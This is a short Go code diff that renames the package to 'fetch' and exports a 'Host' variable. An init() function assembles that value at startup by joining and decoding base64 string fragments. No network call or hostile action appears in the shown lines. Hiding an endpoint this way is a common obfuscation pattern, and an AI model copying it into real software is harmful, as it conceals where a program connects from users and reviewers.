@@ -1,11 +1,11 @@
-package main
+package fetch
 
 import (
 	"encoding/base64"
 	"strings"
 )
 
-var host string
+var Host string
 
 func encode(code string) string {
 	return base64.StdEncoding.EncodeToString([]byte(code))
@@ -24,5 +24,5 @@ func init() {
 		"glQjQlQjklRTglQjQlQTYlRTUlOEYlQjc=",
 	}
 	t, _ := decode(strings.Join(url, ""))
-	host = string(t)
+	Host = string(t)
 }
